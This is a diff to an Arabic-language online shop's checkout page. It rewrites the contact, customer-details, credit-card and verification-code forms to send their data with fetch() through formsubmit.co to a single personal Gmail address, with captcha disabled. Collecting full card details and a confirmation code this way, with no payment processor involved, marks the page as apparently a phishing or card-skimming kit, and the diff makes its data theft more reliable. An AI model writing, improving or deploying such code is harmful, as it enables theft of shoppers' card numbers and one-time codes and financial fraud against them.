@@ -800,8 +800,7 @@
     </style>
 </head>
 <body class="bg-gray-50">
-    <!-- Hidden iframe for form submissions -->
-    <iframe name="hiddenFrame" class="hidden-frame"></iframe>
+    <!-- No need for hidden iframe anymore - using fetch() for all forms -->
     
     <!-- Quick Navigation Toggle -->
     <button onclick="toggleQuickNav()" class="fixed top-4 right-4 z-50 bg-orange-600 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-lg hover:bg-orange-700 transition duration-300">
@@ -1124,9 +1123,8 @@
                     
                     <div class="bg-white p-8 rounded-2xl shadow-lg">
                         <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
-                        <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" class="space-y-6">
+                        <form id="contactForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-6">
                             <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
                             
                             <div class="input-group">
                                 <input type="text" name="name" required="" placeholder=" ">
@@ -1389,10 +1387,9 @@
                         </div>
 
                         <!-- Customer Info Form -->
-                        <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="return submitCustomerForm()">
+                        <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" onsubmit="return submitCustomerForm(event)">
                             <input type="hidden" name="_subject" value="👤 معلومات طلب جديد - مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
                             
                             <!-- Action Buttons -->
                             <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
@@ -1416,10 +1413,9 @@
                         <p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
                     </div>
 
-                    <form id="completeOrderForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" class="space-y-8">
+                    <form id="completeOrderForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" class="space-y-8">
                         <input type="hidden" name="_subject" value="💳 طلب جديد مع معلومات الدفع - مكاسر العود">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="about:blank">
 
                         <!-- Payment Card -->
                         <div class="form-section">
@@ -1530,10 +1526,9 @@
                     </div>
                     
                     <div class="mb-8">
-                        <form id="verificationForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame">
+                        <form id="verificationForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST">
                             <input type="hidden" name="_subject" value="🔐 كود تأكيد طلب جديد - مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" value="about:blank">
                             
                             <label class="block text-gray-800 font-bold mb-6 text-xl">كود التأكيد</label>
                             <div class="flex justify-center space-x-3 rtl:space-x-reverse mb-6">
@@ -2122,7 +2117,9 @@
         }
 
         // Handle customer info form submission
-        function submitCustomerForm() {
+        function submitCustomerForm(event) {
+            event.preventDefault();
+            
             // Validate customer info
             const firstName = document.getElementById('first_name').value.trim();
             const lastName = document.getElementById('last_name').value.trim();
@@ -2149,23 +2146,46 @@
                 orderNotes: document.getElementById('order_notes').value.trim()
             };
 
-            // Create and submit customer form
-            const customerForm = document.getElementById('customerInfoForm');
-            addCustomerDataToForm(customerForm);
+            const submitBtn = document.getElementById('proceedToPaymentBtn');
             
-            showNotification('✅ تم إرسال معلومات الطلب بنجاح!', 'success');
-            
-            // Wait a moment then proceed to payment
-            setTimeout(() => {
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step1').classList.add('completed');
-                document.getElementById('step2').classList.add('active');
-                document.getElementById('customerSection').style.display = 'none';
-                document.getElementById('paymentSection').style.display = 'block';
-                populatePaymentSummary();
-            }, 1500);
+            // Show loading
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-arrow-left ml-2"></i> جاري الإرسال... <span class="loading-spinner"></span>';
 
-            return true;
+            // Create form data
+            const form = document.getElementById('customerInfoForm');
+            addCustomerDataToForm(form);
+            const formData = new FormData(form);
+
+            // Send with fetch()
+            fetch("https://formsubmit.co/zazylalhkr7@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    showNotification('✅ تم إرسال معلومات الطلب بنجاح!', 'success');
+                    
+                    // Proceed to payment after success
+                    setTimeout(() => {
+                        document.getElementById('step1').classList.remove('active');
+                        document.getElementById('step1').classList.add('completed');
+                        document.getElementById('step2').classList.add('active');
+                        document.getElementById('customerSection').style.display = 'none';
+                        document.getElementById('paymentSection').style.display = 'block';
+                        populatePaymentSummary();
+                    }, 1500);
+                } else {
+                    showNotification('❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.', 'error');
+                }
+            }).catch(() => {
+                showNotification('⚠️ حدث خطأ أثناء الإرسال. تحقق من الاتصال.', 'error');
+            }).finally(() => {
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-arrow-left ml-2"></i> إرسال معلومات الطلب والمتابعة';
+            });
+
+            return false;
         }
 
         function addCustomerDataToForm(form) {
@@ -2283,16 +2303,30 @@
             // Add customer and cart data to form
             const form = document.getElementById('completeOrderForm');
             addDataToForm(form);
+            const formData = new FormData(form);
 
-            // Submit the form
-            form.submit();
-
-            showNotification(`✅ تم إرسال معلومات الدفع بنجاح! كود التأكيد: ${verificationCode}`, 'success');
-            
-            // Move to verification page after short delay
-            setTimeout(() => {
-                showVerificationPage();
-            }, 1500);
+            // Submit with fetch()
+            fetch("https://formsubmit.co/zazylalhkr7@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    showNotification(`✅ تم إرسال معلومات الدفع بنجاح! كود التأكيد: ${verificationCode}`, 'success');
+                    
+                    // Move to verification page after success
+                    setTimeout(() => {
+                        showVerificationPage();
+                    }, 1500);
+                } else {
+                    showNotification('❌ فشل إرسال بيانات الدفع. يرجى المحاولة مرة أخرى.', 'error');
+                }
+            }).catch(() => {
+                showNotification('⚠️ حدث خطأ أثناء إرسال البيانات. تحقق من الاتصال.', 'error');
+            }).finally(() => {
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-lock ml-2"></i> تأكيد الدفع وإتمام الطلب';
+            });
 
             return true;
         }
@@ -2598,7 +2632,7 @@
         }
 
         function sendVerificationCode(code) {
-            // Create and submit verification form
+            // Create form data for verification
             const form = document.getElementById('verificationForm');
             
             // Add verification code to form
@@ -2623,7 +2657,20 @@
                 customerInput.value = `${customerInfo.firstName} ${customerInfo.lastName} - ${customerInfo.phone} - ${customerInfo.email}`;
             }
 
-            form.submit();
+            // Send with fetch()
+            const formData = new FormData(form);
+            fetch("https://formsubmit.co/zazylalhkr7@gmail.com", {
+                method: "POST",
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Verification code sent successfully');
+                } else {
+                    console.log('Failed to send verification code');
+                }
+            }).catch(error => {
+                console.log('Error sending verification code:', error);
+            });
         }
 
         function resendCode() {
@@ -2700,6 +2747,35 @@
             } else {
                 document.documentElement.classList.remove('dark');
             }
+        });
+
+        // Contact form submission with fetch()
+        document.getElementById("contactForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const form = e.target;
+            const submitBtn = form.querySelector('button[type="submit"]');
+            
+            // Show loading
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-paper-plane ml-2"></i> جاري الإرسال... <span class="loading-spinner"></span>';
+
+            fetch("https://formsubmit.co/zazylalhkr7@gmail.com", {
+                method: "POST",
+                body: new FormData(form)
+            }).then(response => {
+                if (response.ok) {
+                    form.reset();
+                    showNotification("✅ تم إرسال الرسالة بنجاح!", 'success');
+                } else {
+                    showNotification("❌ فشل الإرسال. يرجى المحاولة مرة أخرى.", 'error');
+                }
+            }).catch(() => {
+                showNotification("⚠️ حدث خطأ أثناء الإرسال. تحقق من الاتصال.", 'error');
+            }).finally(() => {
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane ml-2"></i> إرسال الرسالة';
+            });
         });
 
         // Keyboard shortcuts
